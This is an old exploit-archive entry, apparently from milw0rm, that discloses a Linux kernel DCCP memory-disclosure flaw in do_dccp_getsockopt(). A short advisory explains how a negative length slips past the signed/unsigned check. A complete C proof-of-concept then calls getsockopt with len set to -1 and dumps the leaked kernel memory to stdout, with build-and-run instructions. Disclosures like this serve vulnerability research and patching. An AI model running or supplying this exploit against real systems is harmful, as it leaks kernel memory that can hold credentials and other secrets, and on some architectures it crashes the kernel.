/*
Linux Kernel DCCP Memory Disclosure Vulnerability

Synopsis:

 The Linux kernel is susceptible to a locally exploitable flaw
 which may allow local users to steal data from the kernel memory.

Vulnerable Systems:

 Linux Kernel Versions: >= 2.6.20 with DCCP support enabled.
 Kernel versions <2.6.20 lack
 DCCP_SOCKOPT_SEND_CSCOV/DCCP_SOCKOPT_RECV_CSCOV optnames for
 getsockopt() call with SOL_DCCP level, which are used in the
 delivered POC code.

Author:

 Robert Swiecki
 http://www.swiecki.net
 robert@swiecki.net

Details:

 The flaw exists in do_dccp_getsockopt() function in
 net/dccp/proto.c file.

-----------------------
static int do_dccp_getsockopt(struct sock *sk, int level, int optname,
                   char __user *optval, int __user *optlen)
...
if (get_user(len, optlen))
 return -EFAULT;
if (len < sizeof(int))
  return -EINVAL;
...
-----------------------

 The above code doesn't check `len' variable for negative values.
 Because of cast typing (len < sizeof(int)) is always true for
 `len' values less than 0.

 After that copy_to_user() procedure is called:

-----------------------
if (put_user(len, optlen) || copy_to_user(optval, &val, len))
   return -EFAULT;
-----------------------

 What happens next depends greatly on the cpu architecture in-use -
 each cpu architecture has its own copy_to_user() implementation. On
 the IA-32 the code below ...

-----------------------
unsigned long
copy_to_user(void __user *to, const void *from, unsigned long n)
{
       BUG_ON((long) n < 0);
-----------------------

 ... will prevent explotation, but kernel will oops due to
 invalid opcode in BUG_ON().

 On some other architectures (e.g. x86-64) kernel-space data will
 be copied to the user supplied buffer until end-of-kernel space
 (pagefault in kernel-mode occurs) is reached.

POC:

----------------------- */

#include <netinet/in.h>
#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <net/if.h>
#include <sys/mman.h>
#include <linux/net.h>

#define BUFSIZE 0x10000000

int main(int argc, char *argv[])
{
       void *mem = mmap(0, BUFSIZE, PROT_READ | PROT_WRITE,
                        MAP_ANONYMOUS | MAP_PRIVATE, 0, 0);
       if (!mem) {
               printf("Cannot allocate mem\n");
               return 1;
       }
       /* SOCK_DCCP, IPPROTO_DCCP */
       int s = socket(PF_INET, 6, 33);
       if (s == -1) {
               fprintf(stderr, "socket failure!\n");
               return 1;
       }
       int len = -1;
       /* SOL_DCCP, DCCP_SOCKOPT_SEND_CSCOV */
       int x = getsockopt(s, 269, 11, mem, &len);

       if (x == -1)
               perror("SETSOCKOPT");
       else
               printf("SUCCESS\n");

       write(1, mem, BUFSIZE);

       return 0;
}

//-----------------------
//make poc; ./poc | strings
//-----------------------

// milw0rm.com [2007-03-27]